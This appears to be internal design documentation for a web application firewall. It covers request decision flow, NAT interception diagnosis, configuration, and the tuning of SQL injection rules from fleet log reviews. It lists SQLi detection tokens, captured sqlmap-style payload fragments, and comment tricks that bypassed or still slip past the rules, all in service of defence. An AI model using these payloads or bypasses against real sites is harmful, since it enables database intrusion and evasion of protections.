1. **WAF runs even with valid clearance** for any request that reaches `cfm.lua`. No dynamic payload reaches origin without inspection — except the two Step 0 carve-outs above (a plain `/.well-known/` fetch: GET / HEAD, no query string, no script extension in the path — anything else under the prefix is inspected, since 2026-10-09; and the cPanel API endpoints on a panel proxy host, which cpsrvd authenticates itself; FP case 11). The `/.well-known/` carve-out has a second side: the log-driven decision engine excludes the same requests from per-IP scoring (`isWellKnownChallengeExempt`, `engine.go`; both sides run `scripts/tests/fixtures/wellknown_exempt.txt`). Without it a CA's ACME/DCV validator, which hits many domains and many one-time token paths, trips the scanner heuristics and is flagged; under the since-retired per-IP challenge-DNAT that flag redirected the validator and broke SSL issuance. Any path-based challenge exemption needs the same two-sided treatment.
2. **Post-clearance challenge cannot loop.** Conversion happens before the action switch; the `challenge` branch in the WAF hit handler is unreachable when `clearance_allow=true`.
3. **POST replays are safe.** A resumed POST (`cfm_resumed_post`) is treated like any cleared client — `clearance_allow` keys on `clearance_ok` alone. A *cleared* replay runs the WAF (block-tier blocks; a challenge-tier hit is risk-downgraded by `post_clearance_action`) and then fast-paths to origin at Step 2b, so the stashed save is not lost. An *uncleared* replay that re-triggers a challenge still hits the `block_replayed` safety net (Step 2 challenge branch + Step 3) — the loop it exists to stop.
4. **CFM control endpoints bypass `cfm.lua`.** `/__cfm_challenge`, `/__cfm_verify` are exact-match nginx locations — no WAF, no challenge, no origin.
5. **Static-asset URIs bypass `cfm.lua`** (`.css/.js/.woff2?/.ttf/.eot/.png/.jpe?g/.gif/.webp/.ico/.map`). The `location` block in `openresty.conf` / `angie.conf` skips the access phase and proxies straight to Apache. `.svg` is NOT in the bypass — it can carry script.

`X-CFM-Action` values for visibility:

| Value | Meaning |
|-------|---------|
| `allow_cookie` | No WAF hit, valid clearance, allowed |
| `logonly` | WAF logonly hit, then allowed by the later steps (until 2026-10-09 a logonly hit went straight to origin, skipping Steps 2.5-3; a later block / challenge / throttle now reports its own value) |
| `logonly_pc` | challenge converted to logonly under clearance, then allowed |
| `waf_error` | the WAF raised under `CFM_FAIL_OPEN` (logged `waf_error`), the request went on uninspected and was allowed by the later steps |
| `block` | Direct WAF block |
| `block_pc` | challenge converted to block under clearance + high-risk reason |
| `challenge` | WAF challenge, no clearance |
| `challenge_resume` | Challenge with POST-resume token |
| `block_replayed` | UNCLEARED POST replay re-triggered a challenge → 403 (a cleared replay is converted / fast-pathed instead) |
| `challenge_forced` | nginx-marked location forced challenge |

### Which request bodies the WAF reads (`cfm.lua` `waf_should_read_body`)

- **POST to an allowlisted path** (`.php`, `/wp-admin/`, `/wp-json/`, `/?wc-ajax=`, … — the list in
  `waf_should_read_body`): always read.
- **Any other POST/PUT/PATCH:** read when the Content-Type is inspectable (form, JSON, XML,
  multipart, `text/*`, or none at all) and the Content-Length is at most
  `CFM_WAF_BODY_READ_MAX_CL` (1 MiB).
- **POST on `location /` with no Content-Length (chunked, HTTP/2) or a larger one** (since
  2026-10-09): read too, because nginx buffers that location's bodies anyway (the conf sets
  `$cfm_body_buffered`). Only the first `CFM_WAF_BODY_MAX_LEN` (32 KB) is ever scanned.
  These bodies (and a `/?wc-ajax=` body the size / Content-Type rule would not have read) are
  in **burn-in**: the request is decided without them, as before. When that check made no hit,
  a hit the body produces is pushed as logonly; with no hit or a logonly one, the strongest
  hit only the body produces (a rule the body-free check did not) is logged as
  `waf_body_burnin would=<action> … waf_rule_id=<id>` (one line a minute per IP). The burn-in corpus is those error-log lines (CFM MCP `edge_error_tail`,
  `node="all"`, text `waf_body_burnin`): the pushed record reads like any logonly hit. After a
  clean burn-in, `CFM_WAF_BODY_BUFFERED_ENFORCE=1` (declared with `env` in the edge conf; read
  at worker start) enforces them. Cost: the WAF runs twice on these requests during burn-in,
  about 6-10 ms of worker CPU for a 32 KB body, what an allowlisted POST already pays once.
- A body the module cannot read (an HTTP/3 POST without Content-Length, and HTTP/2 on older
  lua-nginx-module builds) is left unread and logged as `waf_body_unread` (one a minute per
  IP); the request goes on through the other checks. Under `CFM_FAIL_OPEN=0` it gets a 500
  when the old gate would have read it (an allowlisted path); a body read only because the
  location buffers it stays unread, as before.

---

## Upstream interception — when traffic never reaches the WAF

The WAF, the challenge engine and the edge access log see only traffic that
reaches the edge listener. In full-DNAT mode: packet on 80/443 →
`inet cfm_redirect` prerouting DNATs it to 9080/9043 → edge proxy →
`cfm.lua`. **Anything that diverts the packet before our DNAT chain hides it
from the whole L7 stack** (no access-log line, no WAF, no challenge) while the
site keeps working, because the interceptor still proxies to Apache. It is
silent: you notice only by looking for log lines that are not there.

| Interceptor | Where | Effect |
|---|---|---|
| Entries in `/etc/cfm/cfm.dnat_bypass` | `inet cfm_redirect` itself, accept before the dport rules | Listed source IPs go straight to Apache. See `docs/dnat-bypass.md`. |
| **Imunify360 WebShield** | `ip nat` / `ip6 nat` PREROUTING at `dstnat` (-100), iptables-nft | DNATs matched sources (its `i360.ipv4.remote_proxy_static` set holds Cloudflare's ranges) to WebShield, which proxies to Apache. Runs *before* `cfm_redirect` when CFM is at `dstnat + 1` (-99, the default "Imunify-first" mode). |
| `NOTRACK` / `-j CT --notrack` in raw PREROUTING | raw (-300) | Untracked connections skip NAT, so the packet lands on Apache:443. A side effect of "keep CDN traffic out of conntrack" scripts. |

**Seen in production (2026-08-04).** On a cPanel host with CFM (DNAT, -99)
and Imunify360, Cloudflare-proxied domains produced no edge log lines, while
the same request forced to the origin IP (`curl --resolve`) was logged and
inspected. WebShield took every Cloudflare-sourced packet at -100; by -99 the
dport was no longer 80/443. `cfm.dnat_bypass` was empty and the edge conf
(realip from `CF-Connecting-IP`, `trusted_proxies.conf`) was correct.

### Diagnosis recipe

```bash
# 0) Our own chain first: bypass entries + priority
cfm dnat bypass list
cfm dnat                       # note "priority -99" vs "-101" in the State line
nft list table inet cfm_redirect

# 1) Everyone hooked at prerouting, in priority order (lowest runs first)
nft list ruleset | grep -B4 'hook prerouting'

# 2) Who intercepts by source? Look for DNAT/REDIRECT with a src match-set,
#    and check the packet counters climb while you curl through the CDN
iptables -t nat -L PREROUTING -n -v --line-numbers

# 3) Which ipsets hold the CDN ranges (Cloudflare: 173.245.48.0/20,
#    104.16.0.0/13, 172.64.0.0/13, 162.158.0.0/15, 198.41.128.0/17, ...)
ipset list i360.ipv4.remote_proxy_static 2>/dev/null | head

# 4) The one-shot verdict: curl through the CDN and see which PROCESS
#    owns the connection from the CDN edge IP
ss -tnp | grep <cdn-edge-ip>
#   httpd on :443            → NAT skipped entirely (notrack / raw accept)
#   imunify webshield nginx  → WebShield interception (check its logs too:
#                              /var/log/imunify360-webshield/)
#   openresty on :9043       → traffic reaches us; problem is elsewhere
```

### Remedies

Pick who fronts web traffic; both stacks cannot do it for the same packet.

- **CFM-first:** `NFT_DNAT_PRIORITY = -101` in `/etc/cfm/cfm.conf`, then
  `cfm dnat on` (or restart cfm). A bare `cfm dnat on --priority -101` lasts
  only until the next restart, reboot or failsafe recovery, which apply
  cfm.conf's value. All traffic, CDN-sourced included, then flows through the
  edge with the real client IP from `CF-Connecting-IP`. WebShield stops
  seeing web traffic; CFM's challenge replaces its graylist challenge on
  80/443. `edge_health` check H (`web-dnat-order`) warns when a DNAT runs
  ahead while WebShield serves real traffic.
- **Imunify-first (-99, the default):** CDN-sourced traffic is served and
  logged by WebShield, not CFM. By design in this mode, not a CFM logging bug.
- **Disable WebShield** (`imunify360-agent config update
  '{"WEBSHIELD": {"enable": false}}'`): removes the -100 interception and
  keeps the rest of Imunify, so CDN traffic reaches CFM even at -99.

**"Never block Cloudflare" done right** needs no NAT-level exemption; CDN
traffic *should* pass through the edge:
- L4 never-block: CDN ranges in `cfm.ignore` / `cfm.allow`, which render in the
  **input** chain only and cannot hide traffic from the WAF.
- Real client IP: `real_ip_header CF-Connecting-IP` + `trusted_proxies.conf`
  at the edge; scoring, challenge and WAF then apply to the client.
- **Never put CDN ranges in `cfm.dnat_bypass`** (it is for cluster peers /
  WHM transfer sources, `docs/dnat-bypass.md`), and never exempt them from
  NAT / conntrack: either silently disables L7 inspection for every request
  via the CDN, so an attacker only has to put a domain behind Cloudflare to
  bypass the WAF.

---

## Configuration

| Var | Default | Allowed | Notes |
|-----|---------|---------|-------|
| `CFM_WAF_AFTER_CLEARANCE_CHALLENGE` | `logonly` | `block`, `logonly` | What a challenge becomes under clearance for noisy reasons. `challenge` is rejected. |
| `CFM_WAF_AFTER_CLEARANCE_HIGH_RISK` | `block` | `block`, `logonly` | What a challenge becomes under clearance for high-risk reasons. |
| `CFM_WAF_BODY_MAX_LEN` | `32768` | int bytes | Upstream body-read cap (`cfm_cfg.lua`). End-to-end ceiling for body-aware rules — see `body_scan_budget` below. Lowering it below the largest budget shrinks that budget too. |

#### `CFG.body_scan_budget` (Content-Type-keyed body scan budget)

Body-aware detectors (`php_wrappers`, `ssrf_proto`, `js_proto`) consume a normalized `args & body` string built once per request by `get_norm_ab()` in `cfm_waf.lua`. Each request picks its byte budget from `CFG.body_scan_budget` based on the request's `Content-Type`:

| Key | Default | Matches |
|---|---|---|
| `urlencoded` | `8192`  | `application/x-www-form-urlencoded` |
| `json`       | `32768` | a `json` subtype or `+json` suffix (`application/json`, `application/vnd.api+json`, `text/json`; since 2026-10-09, before that `application/json` only) |
| `multipart`  | `16384` | `multipart/form-data` |
| `xml`        | `16384` | an `xml` subtype or `+xml` suffix (`application/xml`, `text/xml`, `application/soap+xml`) |
| `other`      | `2048`  | Everything else (incl. unset / unknown / `text/plain`) |

Every type the header names counts and the largest budget wins (since 2026-10-09), so a
parameter naming another type (`application/json; x=multipart/form-data`) never shrinks it.

That budget caps the **body** side. The query side of the same string gets the request-line
budget (`uri_scan_len`, 8192) when that is larger (since 2026-10-09; on a GET the "other"
2 KB used to cap it, so query padding hid a payload). A JSON body (by media type, or one
that opens with `{` / `[`) has its printable `\u0020`-`\u007E` and `\/` escapes decoded first
(`util.json_unescape_ascii`; `\\` stays one unit, so Gutenberg's `\\u0027` stays text). Control
escapes (`\n`, `\t`, `\u000a` …) are not: the block editor saves a post's newlines as `\n`, and a
multi-line SQL example in a code block would read as an injection.
JSON / XML are matched by subtype or suffix (`/json`, `+json`, `/xml`, `+xml`): an office
document (`vnd.openxmlformats-…`) is a zip and keeps the 2 KB budget.

`CFG.max_scan_len` (default `2048`) is the legacy fallback used by callsites without header context — URI+args scans (`scan_str`) and body-only detectors invoked outside the engine's hot path. The 17+ standalone callsites in `cfm_waf_detectors.lua` still use it; only `get_norm_ab` is on the budget table today.

The `util.body_budget(headers)` helper is hardened against malformed user overrides (non-table values, missing keys, non-positive numbers, non-numeric values) — it falls back to `body_scan_budget.other`, then `CFG.max_scan_len`, then `2048`, so a bad `cfm_waf_config.lua` cannot crash the worker on every body-aware request.

High-risk reason families (matched by `:` prefix) are `_M.WAF_HIGH_RISK_REASONS` in `cfm_waf.lua` (the list is not copied here).
A reason in this list, when fired with `challenge` action under valid clearance, gets converted to `block` instead of `logonly`. Matched against the prefix before the first `:` so `WAF_RCE:REVERSE_SHELL:BASH_TCP` still hits.

### `IGNORE_IPS` / `IGNORE_NETS` (global allowlist for the Lua self-bypass)

`cfm.lua`'s `is_self_origin(ip)` short-circuits the WAF (and the rest of `cfm.lua`) before any rule runs. It honours three sources:

1. **Loopback / IPv4 link-local** (`127.0.0.0/8`, `::1`, `169.254.0.0/16`) — hard-coded. IPv6 link-local (`fe80::/10`) is **never** self, not even the node's own `fe80::` addresses: once the edge listens on IPv6 ([edge-ipv6.md](edge-ipv6.md)), a host on the same L2 segment could connect from any `fe80::` address and skip WAF, challenge and edge bans.
2. **Local interface IPs** of this box, written by `nft.go:writeSelfIPsLua()` to `/var/lib/cfm/lua/cfm_self_ips.lua`.
3. **`[global] IGNORE_IPS` / `IGNORE_NETS`** from `detectors.conf`, written by `detectors.IPIgnore.WriteLuaCache()` to `/var/lib/cfm/lua/cfm_ignore_nets.lua`. Same allowlist the Go challenge engine uses via `SetBypassFunc(ipIgnore.ShouldIgnore)` — wiring them through to the Lua WAF closes the operator-expectation gap where "WAF runs on traffic from my own subnet."

File format (precomputed for fast Lua matching, refresh TTL 30s):

```lua
return {
  generated_at = "2026-05-19T...",
  ips = { ["1.2.3.4"] = true, ["::1"] = true },
  v4_ranges = {
    { 1412837632, 1412837887 },  -- 84.54.49.0/24 as uint32 [first, last]
  },
  v6_ranges = {
    { "2a144280000100010000000000000000", 64 },  -- 2a14:4280:1:1::/64: network as 32 hex digits + prefix
  },
}
```

**IPv6 CIDRs** land in `v6_ranges`; `cfm_selfip.lua` expands the client address to the same 32 hex digits and compares the leading prefix bits. Until 2026-11 they were skipped (only exact IPv6 addresses in `IGNORE_IPS` reached the edge), so an IPv6 network in `IGNORE_NETS` was honoured by the Go challenge engine but still WAF-checked at the edge — and clients behind Cloudflare reach the edge with their own IPv6 address.

**Trigger:** the file is rewritten on every config reload that touches `[global]` (the same path that rebuilds `IPIgnore`), plus once on engine startup.

---

## SQLi blind-family expansion + body scan (rules 301 / 309)

**Why.** A sqlmap scan against the WHMCS ticket form (myip.gr support):
hundreds of tickets, one per payload, all in the urlencoded **body**, which
`rule_sqli` did not read.

**What shipped (2026-06-26):**
1. Both SQLi rules also run over the budgeted `args+body` string
   (`get_norm_ab()`) on POST requests (`cfm_waf.lua` §21 / §21b), not only
   `uri+args` (`get_scan_ua()`).
2. The time-based / boolean / error-based blind family, split by confidence
   (`cfm_waf_detectors.lua`):
   - **301 `rule_sqli`** (`WAF_SQLI`, `block`): `SQLI_BLIND_TOKENS`, the
     DBMS-unique primitives no ordinary word collides with: MSSQL
     `waitfor delay|time`; PostgreSQL `pg_sleep`; Oracle
     `dbms_pipe.receive_message` / `dbms_lock.sleep`; MySQL `now()=sysdate()`
     / `rlike sleep(` / `select sleep(` / `select(sleep(`; error-based `exp(~`;
     the boolean tail `=0+0+0+1`.
   - **309 `rule_sqli_blind_lexical`** (`WAF_SQLI_LEXICAL`, `block`):
     `SQLI_LEXICAL_TOKENS`, real primitives that also collide
     case-insensitively with legit code: `benchmark(`, `extractvalue(`
     (camelCase `extractValue(`), `updatexml(`, `floor(rand(` (valid PHP),
     `randomblob(`, and `or sleep(` / `and sleep(` / `,sleep(` / `(sleep(`.
     Kept separate so this word-colliding set could ship observe-only first.
3. Tokens match a whitespace/`+`-collapsed string, so a form-urlencoded space
   (`+` or `%20`) still hits the spaced tokens.

Tests: `scripts/tests/cfm_waf_sqli_test.lua` (captured payloads, per-DBMS
family, per-rule isolation, FP negatives).

### Rule 319 `rule_sqli_union_variant` (`WAF_SQLI_UNION_VARIANT`, `challenge_v2`)

301 catches `union select` only when the keywords are adjacent after the
`+`/whitespace collapse. 319 (`detect_sqli_union_variant`) matches
`union<mid>select` for `mid` ∈ {` all `, ` distinct `, `(`, ``, `all`,
`distinct`} on the same comment-stripped, collapsed string: `union all
select`, `union distinct select`, `union(select`, `union/**/select` (collapses
to `unionselect`), `union/**/all/**/select`. Same value-terminator guard as
301: `union` must follow a value break (`[%d'"%)]`) or an operand keyword
(`null` / `true` / `false`), so prose like "credit union all selected" does
not fire.

**Mode.** Shipped `logonly` (2026-07-08), promoted to `challenge` and then
`challenge_v2` (2026-09-23) on pure sqlmap-style attack traffic. Its autoblock
stays un-armed until it earns a block promotion of its own (301 already blocks
the adjacent form).

**FP sources to watch** (from review): a camelCase identifier whose value
quote is the terminator (`{"widget":"unionSelect"}` / `unionAllSelect`); SQL
tutorial or DBA-forum content about the keyword; relational-algebra notation
(`(R1)union(select…)`); a technical search box (`?q=PostgreSQL 12 union all
select …`). If they show up, drop the empty- / `all`- / `distinct`-collapsed
camelCase branches (the FP-prone ones) rather than living with the noise.

**Not covered:** a backtick identifier break (`` `col`union all select ``, `` ` `` is not in the
shared terminator class); asymmetric single-side comments (`union/**/all
select`) and `union all(select`; a value-leading `?p=union all select…` (only
`=` before `union`), a deliberate miss to avoid noun-phrase FPs, as in 301.
None is a new block-path hole: 301 still blocks the adjacent form.

### SQLi gaps, 2026-11-18 (rules 301, 309, 319, 332)

**Why.** libinjection 4.0.2 was run over the query strings of ~8 days of
edge access logs on all 8 nodes (~96 M requests with a query): of its 2 057
hits, ~1 590 CFM already blocked or challenged; of the 463 that reached the
origin, ~200 were attacks and ~170 legitimate traffic it would have broken
(Jetpack's `token`, WooCommerce `;` filters, customers' search boxes). So
libinjection was not adopted (`docs/ROADMAP.md` §1); the attacks it caught
fell into a few shapes, each measured on its own over the same logs (8 nodes,
8 days): every match was an attack, none a legitimate request.

**Path and query only.** Every change below applies to the path + query
surface; the args+body surface is read exactly as before. A JSON or
minified-code body is one line, and its first `--` (`var(--wp--preset…)` in
every Gutenberg save) hides the rest of it from 301/309/319. Reading that
rest would put whole posts in front of block-tier, autoblock-armed rules,
and bodies are not in the access logs, so it cannot be measured. A `--` in a
body therefore still hides what follows it there (a known residual).

**What changed:**
- **`strip_sql_comments_query`** (`cfm_waf_util.lua`, the path + query strip
  of 301 / 309 / 319; the body keeps `strip_sql_comments`):
  - A comment ends at its parameter's `&`, and a `--` in the path at the `?`.
    A `--` used to strip to the end of the whole scan string, so
    `?x=--&id=1'+union+select+1,2,3` and `/index.php/--?id=1' union…` (PHP's
    PATH_INFO) read as clean (a bypass of the 301 block; the same for a `/*`
    in one parameter and its `*/` in a later one).
  - The scan string is decoded, so a delimiter may sit inside one parameter
    (`id=1'/*%26*/union select`): with a comment and a delimiter, the strip
    returns the per-part reading AND the whole-string one.
  - A MySQL / MariaDB executable comment `/*!NNNNN…*/` (`/*M!…*/`) keeps its
    content, which the server runs: `catid=0' /*!11110procedure*/
    /*!11110analyse*/ (/*!11110extractvalue*/(…` lost the very
    `extractvalue(` 309 looks for (several sites per node in the 8 days).
  - A `--` comment that ends a part leaves ` --` behind, so a detector can
    see that a comment closed the value; one the next line continues after
    (`1'--\nunion select`) is dropped whole, as before.
- **301 shapes, query only** (`detect_sqli_probe`): `' order by 3--` / `#`
  (after a value break: digit, quote, paren); `procedure analyse(` after a
  value break; the same-word tautology `') and ('x'='x`, `" or "a"="a`
  (`and` / `or` as whole words); `1 and 1=1` ending its parameter or
  followed by SQL punctuation; `utl_inaddr.get_host_address(` (Oracle).
- **332 tag `VAR_DUMP_MD5`** (332 reads the query only): the scanners'
  PHP-eval probe `${@var_dump(md5(631881373))};`, which calls no sink.

All ride families already armed at block (`WAF_SQLI`, `WAF_SQLI_LEXICAL`,
`WAF_RCE`), so they ban at threshold 1. That is deliberate: the fleet read
found only scanners.

**Fleet replay (before merge):** the deployed Lua and this change were run
side by side, with luajit on each node, over every request of the last 8
days whose path or query held a comment, a quote or one of the new shapes:
~2.96 M requests on the 8 nodes. 712 got a different 301 / 309 / 319 answer
(earth 161, titan 165, orion 204, virgo 95, qualityweb 76, mars 5, speedhost
5, rigel 1), and every one was an attack: the Joomla `com_streetguess`
`/*!11110procedure analyse*/` sweep, sqlmap campaigns (`') AND ('x'='x'
AND EXTRACTVALUE(…`, `ORDER BY 1-- -`, `UNION ALL SELECT`), Oracle
`utl_inaddr.get_host_address(` probes, a PhocaCart blind probe. No
legitimate request changed. Check of the replay itself: wherever it said the
deployed Lua blocks at 301, the log says `cfm_block`.

**Second replay, after the review fixes:** the same run over ~2.97 M
requests, now also timing every request on both versions. The same 712
requests changed, all attacks. No regression (no request the deployed Lua
caught at 301/309/319 that this change misses), no error. CPU: the SQLi part
cost ~2.3x the deployed one on average (tens of µs), from the new probe
patterns running on every query. Each now runs only once a plain find has
seen its keyword, which brings it back to the deployed cost (WooCommerce
filter URLs: 17 µs deployed, 17 µs now). The slowest requests were attack
payloads at 1-2 ms on both versions.

**Corpus** (`make waf-corpus --baseline`): 2 more attacks blocked at 301, no
benign sample changed. (A draft that also changed the body caught 11; the
other 9 were DVWA SQLi in POST bodies, given up with the body change.) One
white sample made the first `and 1=1` draft fire (`msg=1 and 1=1 is a very
basic mathematical operation`), hence the "ends the parameter" condition.

**Adversarial review (before merge).** An independent review replayed
~100 hand-picked query strings against main and this branch and found:
- **A CPU DoS, fixed:** the first `--` strip was a `%-%-[^\n]*\n` gsub, O(n²)
  on a run of dashes with no newline (8 KB of `-` cost ~0.5 s of worker CPU,
  1.6 s with the path). It is now a single pass of plain finds (7.5 ms, as on
  main), with a 64 KB guard in the strip test.
- **Bypasses, fixed:** a space added after the `/*!…*/` content split
  `union/*!all*/select` and `extractvalue/*!*/(`, which main caught. An empty
  executable comment is removed again, and a non-empty one gets two readings
  (with a space on each side, and glued).
- **The tautology** had no value-break gate, although its comment said so. It
  has one now. **332** needs 5+ digits (the scanners' random number), so a PHP
  forum search for `var_dump(md5(123))` passes.

**Residual:** SQL typed into a search box can still trip the new shapes
(`?s=top 10 order by 2--`, `?q=… where 1 and 1=1;`, `?s=SQL "procedure
analyse()"`). The 8-day replay found no such request on the fleet. A `--` in
a body still hides what follows it there; `' and 1=1
or …` followed by more words (it reads like that prose); `'nvOpzp; AND 1=1 OR
(<'">…` (a `;` before `and` is not a value break here). Tests:
`scripts/tests/cfm_waf_sqli_gaps_test.lua`,
`scripts/tests/cfm_waf_sqlcomment_query_strip_test.lua` (the body strip
stays pinned by `cfm_waf_sqlcomment_strip_test.lua`).

### FP review — rule 101 (`WAF_TRAVERSAL`), 2026-09-05

Six servers, 7 days: **11 507 hits**, ~2 300 IPs, **0 from Greece**, >95 %
Google Cloud; a 200-row sample was 200/200 scanner payloads (Vite
`/@fs/..%252f…/.env`, Astro `/_image?href=/../../../.env`; 168/200 target
`.env`), and every minority-country row was a scanner too. **0 FP.** The panel
ports enforce block-tier hits only (`PANEL_WAF_MODE = enforce`), so the
promotion denies there too; their section showed 0 hits (`waf_fp_hunt` is the
panel-side watch).

**Decision:** 101 promoted `challenge` → `block`. The `WAF_TRAVERSAL`
autoblock family is **held at 0** (`TRAVERSAL = 0`, in code and
`detectors.conf`): at threshold 1 this volume is ~330 six-hour bans and alerts
a day; arming is the operator's `TRAVERSAL = 1` (`DRY_RUN = 1` to preview). A
string-mode pin of `rule_traversal` in `/etc/cfm/*` is kept; a legacy boolean
`rule_traversal = true` follows the new default (blocks). With
`rule_traversal = "challenge"`, a request that also trips an earlier
challenge-tier rule is logged under that rule (first hit wins among equals).

### FP review — SQLi families, 2026-07

Six servers, `cfm.waf.log`:
- `WAF_SQLI` (301): 24 hits, 24/24 true positives (time-based, union and
  error-based SQLi against WP plugins, PrestaShop, Fuel CMS, a custom login).
  Promoted `challenge` → `block`.
- `WAF_SQLI_LEXICAL` (309): 188 hits, 188/188 true positives, dominated by a
  distributed error-based sqlmap campaign (`extractvalue(…CONCAT(0x7e…ELT…FLOOR(RAND()))`
  with case randomisation and `/**/`) that 301's DBMS-unique tier would have
  missed. Promoted `logonly` → `challenge`, then `block` on 2026-08-23 after a
  wider fleet burn-in.
- `WAF_SUPERGLOBAL` (318): 0 hits then; now `challenge_v2` (a WHMCS logout
  probe was the only 30-day hit).

**Residual risk:** 309 on an `admin-ajax` **POST** could break a plugin whose
XHR body carries a word-colliding token. None seen; if one appears, exclude
309 for that vhost or trim the token from `SQLI_LEXICAL_TOKENS`.

**Re-run this pass** for any family: grep `cfm.waf.log` per reason, group by
`host`+`uri`, classify each as legitimate app (FP) or attack (TP); promote
only on a clean window.

## Known gaps

- **Tokenizer-level SQLi / XSS evasions** (HTML5 mutation XSS, SQLi with no
  fixed token) slip past the substring detectors. libinjection was measured
  on the fleet and not adopted ("SQLi gaps, 2026-11-18"); a shape that
  passes gets its own measured rule.
- **A rule after a short-circuiting `block`** is never evaluated on that
  request, so it never appears in `also_rule_ids` (cost design; see the
  autoblock decision record).
- **Not every detector has a `rule_*` CFG key**, so not every one can be
  switched off per node from `cfm_waf_config.lua`.
